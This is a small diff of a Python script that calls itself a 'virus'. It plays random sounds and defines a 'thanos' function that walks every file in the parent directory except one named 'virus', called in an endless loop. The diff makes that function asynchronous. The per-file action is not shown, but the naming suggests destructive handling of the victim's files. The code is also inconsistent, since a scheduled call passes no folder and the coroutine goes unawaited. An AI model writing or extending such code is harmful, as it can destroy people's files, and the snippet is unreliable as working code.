@@ -2,6 +2,7 @@ import tkinter as tk
 import random
 import os
 import schedule
+import asyncio
 from playsound import playsound
 
 username = os.getlogin()
@@ -65,7 +66,7 @@ def sound():
     soundnb = randomNumber(0, 3)
     playsound('sound'+ str(soundnb) + '.mp3', 0)
 
-def thanos(dossier):
+async def thanos(dossier):
     for nom_fichier in os.listdir(dossier):
         chemin_fichier = os.path.join(dossier, nom_fichier)
         if nom_fichier != 'virus':
@@ -90,5 +91,5 @@ schedule.every(10).seconds.do(thanos)
 bgSound()
 while True:
     schedule.run_pending()
-    thanos('../')
+    asyncio.run(thanos('../'))
 
